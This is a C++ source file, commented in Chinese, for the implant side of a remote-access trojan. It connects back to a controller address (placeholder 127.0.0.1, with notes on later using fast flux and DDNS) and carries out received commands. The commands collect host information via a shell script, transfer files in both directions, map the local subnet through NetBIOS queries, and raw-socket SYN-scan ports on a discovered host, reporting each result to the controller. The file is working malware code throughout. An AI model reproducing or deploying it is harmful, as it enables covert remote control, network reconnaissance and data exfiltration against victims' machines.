/********被控端程序************/
#include "server.h"
#include "synscan.h"
#include "udpscan.h"
#include "scanipandmac.h"

#define CLIENT_PORT 8000//应该是80，这里没用端口复用技术，先用8000临时替代一下
#define BUFFLEN 1024 //缓冲区大小

using namespace std;

int FileRecv(int sock,struct sockaddr *dest);
int FileSend(int sock,struct sockaddr *dest);
int GetLocalInfo(int sock,struct sockaddr *dest);
void DataSend(int sock,struct sockaddr *dest,const char *filename);
int Disconnect(int sock,struct sockaddr *dest);

int main(int argc,char **argv)
{
	int s,n = 0;
	struct sockaddr_in ctr; //控制端目的地址
	char sendbuff[BUFFLEN];
	char recvbuff[BUFFLEN];
	/*控制端的ip地址，为了简单我们事先设定好，以后可以使用fast flux和DDNS技术*/
	char ctr_ip[] = "127.0.0.1";
 
	s = socket(AF_INET,SOCK_STREAM,0);
	
	struct timeval tv;
	tv.tv_sec = 0;
	tv.tv_usec = 200000; //200ms
	if(setsockopt(s,SOL_SOCKET,SO_SNDTIMEO,&tv,sizeof(tv))==-1)
	{
		cout<<"设置发送超时时间失败！"<<endl;
		return -1;
	}
	if(setsockopt(s,SOL_SOCKET,SO_RCVTIMEO,&tv,sizeof(tv))==-1)
    {
        cout<<"设置接收超时时间失败！"<<endl;
        return -1;
	}		
	
	/*初始化地址*/
	bzero(&ctr,sizeof(ctr));
	ctr.sin_family = AF_INET;
	ctr.sin_addr.s_addr = inet_addr(ctr_ip);
	ctr.sin_port = htons(CLIENT_PORT);

	socklen_t len = sizeof(ctr);

	/*连接控制端*/
	if(connect(s,(struct sockaddr *)&ctr,sizeof(ctr)) == -1)
	{
		cout<<"未能成功连接控制端"<<endl;
		return -1;
	}
	cout<<"成功连接到控制端"<<endl;
	memset(sendbuff,0,BUFFLEN);
	strcpy(sendbuff,"READY");

	/*发送数据*/
	sendto(s,sendbuff,strlen(sendbuff),0,(struct sockaddr*)&ctr,sizeof(ctr));

	memset(recvbuff,0,BUFFLEN);
	/*接收数据*/
	int flag = 0;
	while(1)
	{
		n = recvfrom(s,recvbuff,BUFFLEN,0,(struct sockaddr *)&ctr,&len);
		if(n > 0)
		{
			cout<<"收到指令..."<<endl;
			/*判断收到的指令，执行相应的操作*/	
			int *CMD = (int*)recvbuff;
			switch(*CMD)
			{
				case CMD_NULL:
					flag = 1;
					Disconnect(s,(struct sockaddr *)&ctr);break;
				case CMD_HOST_INFO:
					GetLocalInfo(s,(struct sockaddr *)&ctr);break;
				case CMD_IP_MAC:
					ScanMac(s,(struct sockaddr *)&ctr);break;
				case CMD_SCAN_TCP_PORT:
					SYN_Scan(s,(struct sockaddr *)&ctr);break;
				case CMD_FILE_RECV:
					FileRecv(s,(struct sockaddr *)&ctr);break;
				case CMD_FILE_SEND:
					FileSend(s,(struct sockaddr *)&ctr);break;
			}
		}
		if(flag == 1)
                break;
	}
	return 0;
}

/*断开与控制端的连接*/
int Disconnect(int s,struct sockaddr *dest)
{
	close(s);
	cout<<"已断开和控制端的连接..."<<endl;

	return 0;
}
/*发送数据函数*/
void DataSend(int s,struct sockaddr *dest,const char *filename)
{
	char sendbuff[BUFFLEN];
	memset(sendbuff,0,BUFFLEN);
	FILE *fp = fopen(filename,"r+");//打开文件
    if(fp == NULL)
    {
        cout<<"文件："<<filename<<"未找到"<<endl;
    }
    else
    {
        int size = 0;
        cout<<"文件正在传输..."<<endl;
        while((size = fread(sendbuff,1,BUFFLEN,fp)) > 0)
        {
            sendto(s,sendbuff,size,0,dest,sizeof(struct sockaddr_in));
        }
        cout<<"文件传输成功！"<<endl;
        bzero(sendbuff,BUFFLEN);
    }
    fclose(fp);
//    close(s);
}

/*获取主机信息函数*/
/*使用shell脚本获取主机信息，脚本名GetLocalInfo.sh*/
int GetLocalInfo(int s,struct sockaddr *dest)
{
	char sendbuff[BUFFLEN];
	system("sh GetLocalInfo.sh");
	string filename = "GetLocalInfo";
	
	 /*发送主机信息数据*/
	DataSend(s,dest,filename.c_str());

	system("rm GetLocalInfo");
    return 0;
}

/*执行文件接收函数*/
int FileRecv(int s,struct sockaddr *dest)
{
	char recvbuff[BUFFLEN];
	string FileName;
	socklen_t llen = sizeof(*dest);
	strcpy(recvbuff,"OK");
	sendto(s,recvbuff,strlen(recvbuff),0,dest,sizeof(*dest));

    /*接收数据*/
    /*这里要添加文件是否存在的功能，若存在****，不存在就创建*/
	cout<<"请输入要接收的文件名..."<<endl;
	cin>>FileName;
    FILE *fp = fopen(FileName.c_str(),"w+");//这里要添加文件名，这里没写
//  	FILE *fp = fopen("text.txt","w+");
    int len = 0;
    memset(recvbuff,0,BUFFLEN);
    cout<<"开始接收数据..."<<endl;
    cout<<"正在接收数据中..."<<endl;;
    while((len = recvfrom(s,recvbuff,BUFFLEN,0,dest,&llen)) > 0)
    {
        if(fwrite(recvbuff,1,len,fp) < len)
        {
            cout<<"写文件失败！"<<endl;
            break;
        }
        bzero(recvbuff,BUFFLEN);
    }
    cout<<"数据接收完毕！"<<endl;
    fclose(fp);
//    close(s);

    return 0;
}

/*文件发送函数*/
int FileSend(int s,struct sockaddr *dest)
{
	char sendbuff[BUFFLEN];
	strcpy(sendbuff,"OK");
	sendto(s,sendbuff,strlen(sendbuff),0,dest,sizeof(*dest));
	
	/*发送数据*/
	string dataname;
	cout<<"请输入要发送的文件名..."<<endl;
	cin>>dataname;
	DataSend(s,dest,dataname.c_str());	

	return 0;
}

/*校验和计算*/
unsigned short checksum(unsigned short *buff, int size)
{
	unsigned long cksum=0;
	while(size>1)
	{
		cksum+=*buff++;
		size-=sizeof(unsigned short);
	}

	if(size)
		cksum+=*(unsigned char *)buff;

	cksum=(cksum>>16)+(cksum&0xffff);
	cksum+=(cksum>>16);
	
	return (unsigned short)(~cksum);
}

/*填充IP报头函数*/
IP_HEADER fill_ip_header(struct sockaddr_in src,struct sockaddr_in dest)
{
	IP_HEADER head;
	head.h_verlen = (4<<4|sizeof(IP_HEADER)/sizeof(unsigned long));
	head.ip_tos = 0;
	head.ip_len = htons(sizeof(IP_HEADER)+sizeof(TCP_HEADER));
	head.ip_id = 1;
	head.frap_and_flags = 0;
	head.ip_ttl = 128;
	head.ip_proto = IPPROTO_TCP;
	head.ip_sum = 0;
	head.ip_src = src.sin_addr.s_addr;
	head.ip_dst = dest.sin_addr.s_addr;
	return head;
}

/*填充TCP报头函数*/
TCP_HEADER fill_tcp_header(unsigned int i,unsigned short port,char flag)
{
    TCP_HEADER head;
    head.tcp_sport = htons(8888);
    head.tcp_dport = htons(port);
    head.tcp_seq = htonl(i);
    head.tcp_ack = 0;
    head.tcp_len = (sizeof(TCP_HEADER)/4<<4|0);
    head.tcp_flag =flag;  //2:SYN 1:FIN 16:ACK
    head.tcp_win = htons(512);
    head.tcp_sum = 0;
    head.tcp_urp = 0;
    return head;
}

/*填充伪TCP报头函数*/
PSD_HEADER fill_psd_header(IP_HEADER iph,TCP_HEADER tcph)
{
	PSD_HEADER psd;
	psd.saddr = iph.ip_src;
	psd.daddr = iph.ip_dst;
	psd.mbz = 0;
	psd.ptcl = IPPROTO_TCP;
    	psd.tcpl = htons(sizeof(tcph));
	return psd;
}

/*获取本地IP地址函数*/
int GetLocalIp(char *buffer)
{
	int sock;
	int err;
	int dns_port = 53;
	socklen_t namelen;
	struct sockaddr_in serv;
	struct sockaddr_in name;
	const char* kGoogleDnsIp = "8.8.8.8"; 
	
	sock = socket( AF_INET, SOCK_DGRAM, 0); 
  
    memset( &serv, 0, sizeof(serv) ); 
    serv.sin_family = AF_INET; 
    serv.sin_addr.s_addr = inet_addr(kGoogleDnsIp); 
    serv.sin_port = htons( dns_port ); 
  
    err = connect( sock , (const struct sockaddr*) &serv , sizeof(serv) ); 
  
    namelen = sizeof(name); 
    err = getsockname(sock, (struct sockaddr*) &name, &namelen); 
	inet_ntop(AF_INET, &name.sin_addr, buffer, 100); 
  
    shutdown(sock,SHUT_RDWR); 
	return 0;
}

/*使用SYN扫描扫描TCP端口*/
int SYN_Scan(int s,struct sockaddr *dest)
{

	unsigned long inaddr = 1,hostaddr = 1;
	char hostname[128];
	memset(hostname,0,128);
	GetLocalIp(hostname);//获得本机IP地址
	IP_HEADER  ipHeader;
	TCP_HEADER tcpHeader;
	PSD_HEADER psdHeader;
	unsigned int i;
	struct servent *service;
	int sock;
	char *data;
	char *pHost;//要扫描的目的主机IP
	
	/*从文件中读取目的主机IP*/
	ifstream fin("IpAndMac.txt");
	string str;
	int n;
	for(n = 0; n < 2;n++)
		getline(fin,str);//根据IpAndMac.txt文件内容，第二行开始才是IP地址
	int str_len = str.length();
	data = (char *)malloc((str_len+1)*sizeof(char));
	str.copy(data,str_len,0);//string类型转换为char *类型
	pHost = strtok(data," ");//分解字符串函数，这个函数线程不安全，安全版的是strtol_r()函数

	FILE *fp = fopen("tcpport.txt","w+");
	if(fp == NULL)
	{
		cout<<"文件不存在"<<endl;
		return -1;
	}	

	inaddr = inet_addr((const char*)pHost);
	hostaddr = inet_addr(hostname);
	if(inaddr == INADDR_NONE)
	{
		cout<<"输入的参数非法！"<<endl;
		return -1;
	}
	sock = socket(AF_INET,SOCK_RAW,IPPROTO_TCP);
    if(sock == -1)
    {
        cout<<"创建原始套接字出错！"<<endl;
        return -1;
    }
    bool flag = true;
    if(setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char *)&flag,sizeof(flag))==-1)
    {
        cout<<"套接字选项IP_HDRINCL出错！"<<endl;
        return -1;
    }
    struct timeval tv;
    tv.tv_sec = 0;
    tv.tv_usec = 200000; //200ms
    if(setsockopt(sock,SOL_SOCKET,SO_SNDTIMEO,&tv,sizeof(tv))==-1)
    {
        cout<<"设置发送超时时间失败！"<<endl;
        return -1;
    }
	if(setsockopt(sock,SOL_SOCKET,SO_RCVTIMEO,&tv,sizeof(tv))==-1)
    {
        cout<<"设置接收超时时间失败！"<<endl;
        return -1;
    }

	struct sockaddr_in addr_inl,addr_inr;

    addr_inl.sin_family = AF_INET;
    addr_inl.sin_port = htons(8888); //本地端口
    addr_inl.sin_addr.s_addr = hostaddr; //本地地址

	if(bind(sock,(struct sockaddr *)&addr_inl,sizeof(addr_inl))==-1)
    {
        cout<<"绑定本地地址出错！"<<endl;
        return -1;
    }
	addr_inr.sin_family = AF_INET;
    addr_inr.sin_addr.s_addr = inaddr; //目的地址
   	for(i = 1;i <= 10000; i++)
	{
		addr_inr.sin_port = htons(i); //目的端口

	   	//设置IP报头
		ipHeader = fill_ip_header(addr_inl,addr_inr);
		//设置TCP报头
		tcpHeader = fill_tcp_header(i,i,2);
		//设置伪TCP报头   
		psdHeader = fill_psd_header(ipHeader,tcpHeader);
		//计算校验和
		char SendBuf[128] = {0};
		char ReSendBuf[128] = {0};
		char RecvBuf[65535] = {0};
		memcpy(SendBuf,&psdHeader,sizeof(psdHeader));   
       	memcpy(SendBuf+sizeof(psdHeader),&tcpHeader,sizeof(tcpHeader));   
       	tcpHeader.tcp_sum=checksum((unsigned short *)SendBuf,sizeof(psdHeader)+sizeof(tcpHeader));   
      
       	memcpy(SendBuf,&ipHeader,sizeof(ipHeader));   
       	memcpy(SendBuf+sizeof(ipHeader),&tcpHeader,sizeof(tcpHeader));   
       	ipHeader.ip_sum=checksum((unsigned short *)SendBuf,sizeof(ipHeader)+sizeof(tcpHeader));
		memcpy(SendBuf,&ipHeader,sizeof(ipHeader));
		/*发送数据包*/   
		int rect = -1;
		rect = sendto(sock,SendBuf,sizeof(ipHeader)+sizeof(tcpHeader),0,(struct sockaddr *)&addr_inr,sizeof(addr_inr));
		if(rect == -1)
		{
			cout<<"发送错误！"<<endl;
			return -1;
		}
		
		/*等待回应*/
		socklen_t buflen = sizeof(addr_inr);
		unsigned int itime = 0;
		while(itime < 2)
		{
			memset(RecvBuf,0,sizeof(RecvBuf));
			int s = -1;
			s = recvfrom(sock,RecvBuf,sizeof(RecvBuf),0,(struct sockaddr *)&addr_inr,&buflen);
			if(s != -1)
			{
				/*对接收到的数据包解包*/
	        	IP_HEADER *iphdr;
    	    	TCP_HEADER *tcphdr;
        		unsigned short iphdrlen;

        		iphdr = (IP_HEADER *)RecvBuf;
        		iphdrlen = 4*(iphdr->h_verlen & 0x0f);
        		tcphdr = (TCP_HEADER *)(RecvBuf + iphdrlen);

        		if(iphdr->ip_src != addr_inr.sin_addr.s_addr)
            		break;
        		if(iphdr->ip_dst != addr_inl.sin_addr.s_addr)
            		break;
        		if(tcphdr->tcp_sport != htons(i))
            		break;
        		if(tcphdr->tcp_dport != htons(8888))
            		break;
				
				/*查看序列号是否正确*/
        		if(ntohl(tcphdr->tcp_ack) != i && ntohl(tcphdr->tcp_ack) != (i+1))
            		break;
        		if(tcphdr->tcp_flag == 20)   //RST=1 ACK=1 端口关闭
            		break;
        		if(tcphdr->tcp_flag == 18)   //SYN=1 ACK=1 端口开放
        		{
					if((service = getservbyport(htons(i),"tcp")) != NULL)
					{
						fprintf(fp,"tcp:%d port open,service: %s\n",i,service->s_name);
						fflush(fp);
					}
					else
					{
						fprintf(fp,"tcp:%d port open,service: unknown!\n",i);
						fflush(fp);
					}
	           		/*发送RST数据包断开连接*/
            		//设置IP报头
            		ipHeader = fill_ip_header(addr_inl,addr_inr);

            		//设置TCP报头
            		tcpHeader = fill_tcp_header(i,i,4);

            		//设置伪TCP报头   
            		psdHeader = fill_psd_header(ipHeader,tcpHeader);
					memcpy(ReSendBuf,&psdHeader,sizeof(psdHeader));
            		memcpy(ReSendBuf+sizeof(psdHeader),&tcpHeader,sizeof(tcpHeader));
            		tcpHeader.tcp_sum=checksum((unsigned short *)ReSendBuf,sizeof(psdHeader)+sizeof(tcpHeader));

            		memcpy(ReSendBuf,&ipHeader,sizeof(ipHeader));
            		memcpy(ReSendBuf+sizeof(ipHeader),&tcpHeader,sizeof(tcpHeader));
            		ipHeader.ip_sum=checksum((unsigned short *)ReSendBuf,sizeof(ipHeader)+sizeof(tcpHeader));
            		memcpy(ReSendBuf,&ipHeader,sizeof(ipHeader));

            		int rect1 = -1;
            		rect1 = sendto(sock,ReSendBuf,sizeof(ipHeader)+sizeof(tcpHeader),0,(struct sockaddr *)&addr_inr,sizeof(addr_inr));
            		if(rect1 == -1)
            			cout<<"发送错误！"<<endl;
                	break;
				}
			}
			itime++;
		}

	}
	shutdown(sock,2);
    close(sock);
	DataSend(s,dest,"tcpport.txt");
//	close(s);

	return 0;
}

/*扫描局域网内的在线主机IP及MAC地址*/
int ScanMac(int s,struct sockaddr *dest)
{
	int j = 0,num = 254;
	unsigned long tempStartIp,StartIp;
	int sockfd; //套接字描述符
	char sendbuff[sendmaxsize];
	char recvbuff[recvmaxsize];
	char hostip[128];
	GetLocalIp(hostip);
	StartIp = inet_network(hostip);
	StartIp = (StartIp & 0xffffff00) + 1;
	tempStartIp = StartIp;
	
	FILE *fp = fopen("IpAndMac.txt","w+");
	if(fp == NULL)
	{
		cout<<"文件出错"<<endl;
		return -1;
	}	
	char str1[] = "IP Address";
	char str2[] = "Host Name";
	char str3[] = "MAC Address";
	fprintf(fp,"%-16s%-16s%-16s\n",str1,str2,str3);
	fflush(fp);
	memset(sendbuff,0,sizeof(sendbuff));
	memset(recvbuff,0,sizeof(recvbuff));
	
	sockfd = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP); //创建UDP套接字
	if(sockfd == -1)
		return 0;//套接字创建失败
	struct timeval timeout;
	timeout.tv_sec = 3;
	timeout.tv_usec = 0; //200ms
	if(setsockopt(sockfd,SOL_SOCKET,SO_SNDTIMEO,&timeout,sizeof(timeout))==-1)
	{
		cout<<"设置发送超时时间失败！"<<endl;
		return -1;
	}
	if(setsockopt(sockfd,SOL_SOCKET,SO_RCVTIMEO,&timeout,sizeof(timeout))==-1)
    {
        cout<<"设置接收超时时间失败！"<<endl;
        return -1;
	}
	
	struct sockaddr_in destip;//目的地址
    bzero((char *)&destip,sizeof(destip));
    destip.sin_family = AF_INET;
    destip.sin_port = htons(NBNS_PORT);

	struct Q_NETBIOSNS nbns;
	nbns.flags = 0;
    nbns.questions = 0x0100;
    nbns.ans = 0;
    nbns.authRRs = 0;
    nbns.addRRs = 0;
    nbns.name[0] = 0x20;
    nbns.name[1] = 0x43;
    nbns.name[2] = 0x4b;
	int k = 0;
    for(k = 3;k < 34;k++)
        nbns.name[k] = 0x41;
    nbns.name[33] = 0;
    nbns.type = 0x2100;
    nbns.clas = 0x0100;
	//构建netbios-ns包
	int i = 0;
	for(i = 0;i < num;i++)
	{
		nbns.ID = 0+j;
		memcpy(sendbuff,&nbns,sizeof(nbns));

		destip.sin_addr.s_addr = htonl(StartIp + j);
		j++;
		int err = 0;
		err = sendto(sockfd,sendbuff,sizeof(sendbuff),0,(struct sockaddr*)&destip,sizeof(destip));
		if(err == -1)
			return -1;//发送数据出错
	}
	unsigned int flag = 0;//跳出while(1)的标志
	while(1)
	{
		fd_set fd; //
		struct timeval tv;
		tv.tv_sec = 0;
		tv.tv_usec = 200000;	//设置200ms的等待时间，select等待
		FD_ZERO(&fd);	//清空文件描述符集合
		FD_SET(sockfd,&fd);	//添加描述符
		int maxfd = sockfd + 1;
		int ret;
		ret = select(maxfd,&fd,NULL,NULL,&tv);//监视文件描述符，查看是否可以进行读操作
		switch(ret)
		{
			case -1:   //出错
			case 0:	   //超时
				flag = 1;break;
			default:
				recvfrom(sockfd,recvbuff,sizeof(recvbuff),0,NULL,NULL);
			unsigned short tempid = 0;
			memcpy(&tempid,recvbuff,2);
			unsigned long tempip = tempStartIp;
			tempip += tempid;	//得到当前的IP地址（主机字节序）
			struct sockaddr_in toaddr;
			bzero((char*)&toaddr,sizeof(toaddr));
			toaddr.sin_addr.s_addr = htonl(tempip);//IP地址转换为网络字节序
			fprintf(fp,"%-16s",inet_ntoa(toaddr.sin_addr));
			fflush(fp);
			unsigned short numofname = 0;
			memcpy(&numofname,recvbuff+56,1);
			
			int i = 0;
				char NetbiosName[16] = {0};
				memcpy(NetbiosName,recvbuff+57+1*18,16);
				fprintf(fp,"%-16s",NetbiosName);
				fflush(fp);
			unsigned short mac[6] = {0x0000};
			for(i = 0;i < 6;i++)
			{	
				memcpy(&mac[i],recvbuff+57+numofname*18+i,1);
				fprintf(fp,"%x",mac[i]);
				fflush(fp);
				if(i!=5) 
				{		
					fprintf(fp,":");
					fflush(fp);
				}
			}				
			fprintf(fp,"\n");
			fflush(fp);
		}
		if(flag == 1)
			break;
	}
	close(sockfd);
    DataSend(s,dest,"IpAndMac.txt");
  //  close(s);

	return 0;
}


